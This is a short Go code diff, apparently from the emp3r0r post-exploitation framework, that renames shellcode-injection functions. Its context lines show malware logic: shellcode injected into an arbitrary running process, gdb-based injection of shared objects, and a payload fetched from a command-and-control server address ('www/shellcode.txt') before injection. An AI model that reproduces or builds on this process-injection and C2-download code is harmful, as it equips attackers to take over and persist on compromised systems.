@@ -68,9 +68,9 @@ func gdbInjectSO(path_to_so string, pid int) error {
 	return nil
 }
 
-// Injector inject shellcode to arbitrary running process
+// ShellcodeInjector inject shellcode to arbitrary running process
 // target process will be restored after shellcode has done its job
-func Injector(shellcode *string, pid int) error {
+func ShellcodeInjector(shellcode *string, pid int) error {
 	// format
 	*shellcode = strings.Replace(*shellcode, ",", "", -1)
 	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
@@ -245,8 +245,8 @@ func GDBInjectSO(pid int) error {
 	return gdbInjectSO(so_path, pid)
 }
 
-// InjectShellcode inject shellcode to a running process using various methods
-func InjectShellcode(pid int, method string) (err error) {
+// InjectorHandler handles `injector` module
+func InjectorHandler(pid int, method string) (err error) {
 	// prepare the shellcode
 	prepare_sc := func() (shellcode string, shellcodeLen int) {
 		sc, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/shellcode.txt", "")
@@ -271,7 +271,7 @@ func InjectShellcode(pid int, method string) (err error) {
 		err = GDBInjectSO(pid)
 	case "native":
 		shellcode, _ := prepare_sc()
-		err = Injector(&shellcode, pid)
+		err = ShellcodeInjector(&shellcode, pid)
 	default:
 		err = fmt.Errorf("%s is not supported", method)
 	}
